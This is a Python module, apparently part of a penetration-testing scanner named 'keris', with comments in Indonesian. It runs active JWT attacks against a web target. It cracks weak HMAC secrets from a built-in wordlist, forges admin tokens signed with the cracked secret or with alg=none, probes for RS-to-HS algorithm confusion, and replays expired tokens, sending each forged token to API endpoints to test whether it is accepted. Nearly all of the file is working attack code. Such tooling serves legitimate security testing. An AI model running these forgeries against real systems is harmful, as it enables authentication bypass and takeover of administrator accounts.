"""JWT attack: forge & exploit aktif (bukan hanya analisis statis).

Menghasilkan token hasil serangan lalu mengirimkannya ke endpoint untuk
membuktikan kerentanan:
- alg=none: token tanpa signature
- weak HMAC secret brute (wordlist lebih besar + variasi)
- algorithm confusion RS->HS dengan secret publik (jika diketahui)
- replay expired token yang seharusnya ditolak
"""

import base64
import binascii
import hashlib
import hmac
import json
import time
from typing import Dict, List, Optional, Tuple

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

WEAK_SECRETS_BIG = [
    "secret", "password", "123456", "12345678", "123456789", "qwerty", "admin",
    "changeme", "key", "jwt", "jwtsecret", "jwt_secret", "mysecret",
    "supersecret", "secretkey", "secret-key", "your-256-bit-secret",
    "your-secret-key", "test", "test123", "testsecret", "letmein", "login",
    "token", "superadmin", "12345", "1234", "000000", "default", "defaultkey",
    "password123", "admin123", "root", "root123", "access", "auth", "auth0",
    "auth-secret", "auth_secret", "jwtsecretkey", "jwt_key", "s3cr3t",
    "p@ssw0rd", "hello", "world", "secret123", "secret_key", "signing-key",
    "signing_secret", "hs256", "hs256secret", "my-jwt-secret", "mysupersecret",
    "verysecret", "very-secret", "ultrasecret", "devsecret", "staging",
    "production", "prod", "k8s", "kubernetes", "nodejs", "express", "django",
    "flask", "laravel", "rails", "spring", "secretkey123", "changeit",
    "changethis", "changeme123", "abcdef", "0123456789", "averylongsecret",
]

# varian umum: "secret-123", "secret_123", "secret123", "{base}-secret", dll.
def _secret_variants(wordlist: List[str], hint: Optional[str] = None) -> List[str]:
    out = list(dict.fromkeys(wordlist))
    if hint:
        base = hint.strip()
        if base:
            for suffix in ("", "123", "2024", "2025", "2026", "_key", "-key", "_secret", "-secret"):
                out.append(f"{base}{suffix}")
    return out


def _b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def _b64d(seg: str) -> bytes:
    pad = 4 - len(seg) % 4
    if pad != 4:
        seg += "=" * pad
    return base64.urlsafe_b64decode(seg)


def encode_jwt(header: dict, payload: dict, secret: Optional[str] = None,
               alg: Optional[str] = None) -> str:
    """Buat token JWT. Tanpa secret + alg=none = tanpa signature."""
    h = dict(header)
    p = dict(payload)
    if alg:
        h["alg"] = alg
    if secret is None:
        h["alg"] = "none"
        return f"{_b64u(json.dumps(h).encode())}.{_b64u(json.dumps(p).encode())}."
    h.setdefault("alg", "HS256")
    signing = f"{_b64u(json.dumps(h).encode())}.{_b64u(json.dumps(p).encode())}"
    digestmod = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(h.get("alg"), hashlib.sha256)
    digest = hmac.new(secret.encode(), signing.encode(), digestmod).digest()
    return f"{signing}.{_b64u(digest)}"


def forge_none_token(payload: dict) -> str:
    """Token alg=none tanpa signature."""
    return encode_jwt({"alg": "none", "typ": "JWT"}, payload)


def forge_hs_token(payload: dict, secret: str, alg: str = "HS256") -> str:
    return encode_jwt({"alg": alg, "typ": "JWT"}, payload, secret=secret, alg=alg)


def _hmac_valid(parts: List[str], secret: str, alg: str) -> bool:
    alg_map = {
        "HS256": (hashlib.sha256, 64),
        "HS384": (hashlib.sha384, 96),
        "HS512": (hashlib.sha512, 128),
    }
    if alg not in alg_map:
        return False
    digestmod, _ = alg_map[alg]
    signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
    try:
        sig = _b64d(parts[2])
    except (binascii.Error, ValueError):
        return False
    expected = hmac.new(secret.encode(), signing_input, digestmod).digest()
    return hmac.compare_digest(sig, expected)


def crack_hs_secret(token: str, wordlist: Optional[List[str]] = None,
                    hint: Optional[str] = None) -> Optional[Tuple[str, str]]:
    """Crack signature HMAC dengan wordlist. Kembalikan (secret, alg) atau None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64d(parts[0]).decode("utf-8", errors="replace"))
    except Exception:
        return None
    if not isinstance(header, dict):
        return None
    alg = header.get("alg", "")
    if alg not in ("HS256", "HS384", "HS512"):
        return None
    for secret in _secret_variants(wordlist or WEAK_SECRETS_BIG, hint):
        if _hmac_valid(parts, secret, alg):
            return secret, alg
    return None


def _probe_accepts(client: KerisHTTP, endpoint: str, token: str,
                   how: str) -> Optional[str]:
    """Kirim token ke endpoint; cek apakah respons menunjukkan token diterima."""
    try:
        r = client.get(endpoint, headers={"Authorization": f"Bearer {token}"},
                       allow_redirects=False, timeout=15)
    except Exception:
        return None
    # 2xx = diterima; redirect ke login / 401/403 = ditolak
    if 200 <= r.status_code < 300:
        return f"endpoint {endpoint} merespons {r.status_code} dengan token {how}"
    return None


def run_jwt_attack(base: str, token: str, client: KerisHTTP,
                   endpoints: Optional[List[str]] = None,
                   username: str = "admin") -> List[Finding]:
    """Jalankan serangkaian serangan JWT terhadap token yang ditemukan."""
    findings: List[Finding] = []
    parts = token.split(".")
    if len(parts) != 3:
        return findings

    probe_eps = endpoints or [base.rstrip("/") + "/api/me", base.rstrip("/") + "/api/user"]
    info("=== JWT ATTACK ===")

    # 1. brute weak secret
    hit = crack_hs_secret(token)
    if hit:
        secret, alg = hit
        findings.append(Finding(
            "CRITICAL", "JWT weak secret terbukti (dapat dipalsukan)",
            probe_eps[0],
            f"Signature {alg} valid dengan secret `{secret}` yang umum. Attacker "
            "dapat memalsukan token untuk user mana pun (mis. admin).",
            f"secret: {secret}, alg: {alg}",
        ))
        # buktikan: forge token admin
        try:
            decoded = json.loads(_b64d(parts[1]).decode("utf-8", errors="replace"))
        except Exception:
            decoded = {}
        if not isinstance(decoded, dict):
            decoded = {}
        forged = dict(decoded)
        forged["user"] = username
        forged["role"] = "admin"
        forged["admin"] = True
        forged.pop("exp", None)
        forged.pop("iat", None)
        tok = forge_hs_token(forged, secret, alg)
        proof = _probe_accepts(client, probe_eps[0], tok, f"forged admin (secret {secret})")
        if proof:
            findings.append(Finding(
                "CRITICAL", "JWT forged admin diterima server",
                probe_eps[0],
                "Token admin palsu yang dibuat dengan secret hasil crack diterima endpoint.",
                proof,
            ))
        else:
            warn("Token forged dikirim, endpoint tidak merespons 2xx")
        ok(f"JWT weak secret: {secret}")

    # 2. alg=none
    try:
        decoded = json.loads(_b64d(parts[1]).decode("utf-8", errors="replace"))
    except Exception:
        decoded = {}
    if not isinstance(decoded, dict):
        decoded = {}
    forged_none = dict(decoded)
    forged_none["user"] = username
    forged_none["role"] = "admin"
    forged_none["admin"] = True
    forged_none.pop("exp", None)
    tok_none = forge_none_token(forged_none)
    proof_none = _probe_accepts(client, probe_eps[0], tok_none, "alg=none forged admin")
    if proof_none:
        findings.append(Finding(
            "CRITICAL", "JWT alg=none diterima server (bypass autentikasi)",
            probe_eps[0],
            "Server menerima token tanpa signature dengan klaim admin.",
            proof_none,
        ))
        ok("JWT alg=none DITERIMA")

    # 3. alg confusion (RS -> HS): hanya jika token asli RS*
    try:
        header = json.loads(_b64d(parts[0]).decode("utf-8", errors="replace"))
    except Exception:
        header = {}
    if not isinstance(header, dict):
        header = {}
    if str(header.get("alg", "")).startswith("RS"):
        # coba secret = "public" / token itu sendiri (RS256 confusion umum)
        for cand in ("public", "private", "-----BEGIN PUBLIC KEY-----", token):
            if _hmac_valid(parts, cand, "HS256"):
                findings.append(Finding(
                    "HIGH", "JWT algorithm confusion (RS -> HS)",
                    probe_eps[0],
                    "Token RS256 memenuhi verifikasi HS256 dengan secret publik. "
                    "Server kemungkinan menggunakan kunci publik sebagai HMAC secret.",
                    f"secret publik terdeteksi: {cand[:40]}",
                ))
                break

    # 4. expired token replay (jika exp ada dan sudah lewat)
    try:
        payload = json.loads(_b64d(parts[1]).decode("utf-8", errors="replace"))
    except Exception:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}
    exp = payload.get("exp")
    if isinstance(exp, (int, float)) and exp < time.time():
        proof_exp = _probe_accepts(client, probe_eps[0], token, "expired token replay")
        if proof_exp:
            findings.append(Finding(
                "MEDIUM", "JWT kedaluwarsa tetap diterima (replay)",
                probe_eps[0],
                "Token yang sudah lewat masa berlaku masih diterima oleh endpoint.",
                proof_exp,
            ))

    return findings